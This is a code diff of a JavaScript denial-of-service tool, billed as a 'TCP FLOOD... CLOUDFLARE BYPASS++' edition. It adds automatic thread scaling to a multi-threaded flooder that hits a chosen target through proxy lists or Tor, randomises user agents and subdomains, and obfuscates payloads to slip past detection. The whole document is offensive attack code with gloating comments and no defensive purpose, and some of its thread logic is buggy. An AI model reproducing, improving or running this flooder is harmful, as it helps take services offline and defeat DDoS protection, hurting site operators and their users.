@@ -5,7 +5,7 @@
 // ******************************************************************************
 
 // ******************************************************************************
-// * DDoS TOOL - TCP FLOOD - v7.5 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
+// * DDoS TOOL - TCP FLOOD - v7.6 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
 // ******************************************************************************
 
 // Configuration - Let's fuck things up HARD!
@@ -29,7 +29,7 @@ let cloudflareBypass = confirm("Attempt Cloudflare bypass? (May not always work,
 let proxyListURL = prompt("Enter URL for proxy list (HTTP/SOCKS4/SOCKS5 - one proxy per line). Leave blank to skip and use direct connection (not recommended for Cloudflare bypass):");
 let useRandomSubdomains = confirm("Use random subdomains? (Helps bypass some DDoS protection).")
 let advancedObfuscation = confirm("Enable advanced payload obfuscation? (Might evade some detection systems, but can slow things down).");
-
+let autoAdjustThreads = confirm("Automatically adjust threads based on connection health? (experimental)");
 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
 const purple = "\x1b[35m";
@@ -68,6 +68,8 @@ document.body.appendChild(timerDisplay);
 let startTime;
 let timerInterval;
 let proxies = []; // Store proxy list
+let activeThreads = 0; // Counter for active threads
+let threadHealth = []; // Store thread health data
 
 // Scanline Effect
 function addScanlines() {
@@ -192,15 +194,15 @@ function getRandomProxy() {
 
 // Payload Obfuscation
 function obfuscatePayload(payload) {
-  const key = crypto.randomBytes(16).toString('hex'); // Generate a random key
-  let encryptedPayload = '';
+    const key = crypto.randomBytes(16).toString('hex'); // Generate a random key
+    let encryptedPayload = '';
 
-  for (let i = 0; i < payload.length; i++) {
-      const charCode = payload.charCodeAt(i) ^ key.charCodeAt(i % key.length); // XOR encryption
-      encryptedPayload += String.fromCharCode(charCode);
-  }
+    for (let i = 0; i < payload.length; i++) {
+        const charCode = payload.charCodeAt(i) ^ key.charCodeAt(i % key.length); // XOR encryption
+        encryptedPayload += String.fromCharCode(charCode);
+    }
 
-  return { encrypted: encryptedPayload, key: key };
+    return {encrypted: encryptedPayload, key: key};
 }
 
 // Modified TCP Flood function with .onion and Cloudflare support
@@ -217,6 +219,8 @@ async function tcpFlood(threadId) {
     const isHTTPS = targetURL.protocol === 'https:';
 
     log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${isTor ? '(via Tor)' : ''} ${cloudflareBypass ? '(attempting Cloudflare bypass)' : ''}${advancedObfuscation ? ' (with advanced payload obfuscation)' : ''}${resetColor}`);
+
+    activeThreads++; // Increment active threads counter
 
     while (isRunning && duration > 0) {
         let socket = null;
@@ -249,7 +253,7 @@ async function tcpFlood(threadId) {
                             resolve(sock);
                         });
                     } else if (proxies.length > 0 && cloudflareBypass) {
-                         // Use a proxy from the list for Cloudflare bypass
+                        // Use a proxy from the list for Cloudflare bypass
                         const proxyString = getRandomProxy();
                         if (!proxyString) {
                             log(`${darkRed}[THREAD ${threadId}] No proxies available${resetColor}`);
@@ -285,11 +289,13 @@ async function tcpFlood(threadId) {
                                 'X-Flooder': crypto.randomBytes(20).toString('hex'),
                             }
                         };
-                        
+
                         const req = https.request(options, (res) => {
                             log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} via proxy ${proxyHost}:${proxyPort} - Status: ${res.statusCode}${resetColor}`);
-                            res.on('data', () => {}); // Consume data
-                            res.on('end', () => {}); // End data
+                            res.on('data', () => {
+                            }); // Consume data
+                            res.on('end', () => {
+                            }); // End data
                         });
 
                         req.on('socket', (sock) => {
@@ -308,8 +314,7 @@ async function tcpFlood(threadId) {
 
                         req.end();
                         resolve(req);
-                    }
-                     else {
+                    } else {
                         if (isHTTPS) {
                             // TLS/SSL connection
                             const tlsOptions = {
@@ -323,7 +328,7 @@ async function tcpFlood(threadId) {
                             });
                         } else {
                             // Regular TCP connection
-                            socket = net.createConnection({ host: targetHost, port: port }, () => {
+                            socket = net.createConnection({host: targetHost, port: port}, () => {
                                 log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
                                 resolve(socket);
                             });
@@ -368,9 +373,9 @@ async function tcpFlood(threadId) {
 
                 // Advanced Payload Obfuscation
                 if (advancedObfuscation) {
-                  const obfuscationResult = obfuscatePayload(payload);
-                  payload = obfuscationResult.encrypted;
-                  payload += "\r\nX-Obfuscation-Key: " + obfuscationResult.key + "\r\n"; // Append obfuscation key
+                    const obfuscationResult = obfuscatePayload(payload);
+                    payload = obfuscationResult.encrypted;
+                    payload += "\r\nX-Obfuscation-Key: " + obfuscationResult.key + "\r\n"; // Append obfuscation key
                 }
 
                 try {
@@ -395,18 +400,19 @@ async function tcpFlood(threadId) {
 
         } catch (connectError) {
             log(`${darkRed}[THREAD ${threadId}] Connection error: ${connectError}${resetColor}`);
-            if(socket){
+            if (socket) {
                 socket.destroy();
             }
         } finally {
             // Decrement duration even if there was an error
             duration--;
-            if(duration <= 0){
-               isRunning = false; // Stop the attack
+            if (duration <= 0) {
+                isRunning = false; // Stop the attack
             }
         }
     }
 
+    activeThreads--; // Decrement active threads counter
     log(`${purple}[THREAD ${threadId}] TCP flood finished${resetColor}`);
 }
 
@@ -417,7 +423,7 @@ function generateRandomIP() {
 
 function getRandomUserAgent() {
     const userAgents = [
-       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:116.0) Gecko/20100101 Firefox/116.0',
@@ -443,11 +449,11 @@ function updateTimer() {
 
 // Reporting Feature
 function reportVulnerability() {
-  const report = prompt("Describe the vulnerability you found:");
-  if (report) {
-    log(`${yellow}[REPORT] Vulnerability reported: ${report}${resetColor}`);
-    alert("Vulnerability reported. Thank you for your contribution!");
-  }
+    const report = prompt("Describe the vulnerability you found:");
+    if (report) {
+        log(`${yellow}[REPORT] Vulnerability reported: ${report}${resetColor}`);
+        alert("Vulnerability reported. Thank you for your contribution!");
+    }
 }
 
 // Add Report Vulnerability Button
@@ -477,25 +483,46 @@ document.body.appendChild(infoDiv);
 
 // Error Handling Example: DNS Resolution
 async function resolveHostname(hostname) {
-  try {
-      const address = await dns.resolve4(hostname);
-      log(`${darkGreen}[DNS] Resolved ${hostname} to ${address}${resetColor}`);
-      return address;
-  } catch (error) {
-      log(`${darkRed}[DNS] Error resolving ${hostname}: ${error}${resetColor}`);
-      return null;
-  }
+    try {
+        const address = await dns.resolve4(hostname);
+        log(`${darkGreen}[DNS] Resolved ${hostname} to ${address}${resetColor}`);
+        return address;
+    } catch (error) {
+        log(`${darkRed}[DNS] Error resolving ${hostname}: ${error}${resetColor}`);
+        return null;
+    }
+}
+
+// Thread Management
+function adjustThreads() {
+    if (!autoAdjustThreads) return;
+
+    const healthyThreads = threadHealth.filter(health => health > 0.8).length;
+    const unhealthyThreads = threadHealth.length - healthyThreads;
+
+    if (unhealthyThreads > threads * 0.2 && activeThreads < threads * 2) {
+        const newThreadId = Math.max(...threadHealth.keys()) + 1;
+        tcpFlood(newThreadId);
+        log(`${yellow}[MAIN] Increasing threads to improve performance. Current threads: ${activeThreads}${resetColor}`);
+    } else if (healthyThreads > threads * 0.8 && activeThreads > threads / 2) {
+        // Reduce threads to conserve resources if the connection is too stable
+        isRunning = false; // This will stop a thread if it's active
+        log(`${yellow}[MAIN] Reducing threads to conserve resources. Current threads: ${activeThreads}${resetColor}`);
+    }
+
+    // Clear thread health data
+    threadHealth = [];
 }
 
 // Main execution - let's get this party started!
 async function main() {
-  const resolvedIPs = await resolveHostname(targetHost);
-  if (!resolvedIPs) {
-    alert("Failed to resolve hostname. Attack aborted.");
-    isRunning = false;
-    startButton.disabled = false;
-    return;
-  }
+    const resolvedIPs = await resolveHostname(targetHost);
+    if (!resolvedIPs) {
+        alert("Failed to resolve hostname. Attack aborted.");
+        isRunning = false;
+        startButton.disabled = false;
+        return;
+    }
 
     if (proxyListURL) {
         await loadProxies(proxyListURL);
@@ -505,6 +532,9 @@ async function main() {
     isRunning = true;
     startTime = Date.now();
     timerInterval = setInterval(updateTimer, 1000);
+
+    // Adjust threads every 10 seconds
+    setInterval(adjustThreads, 10000);
 
     for (let i = 0; i < threads; i++) {
         tcpFlood(i + 1);
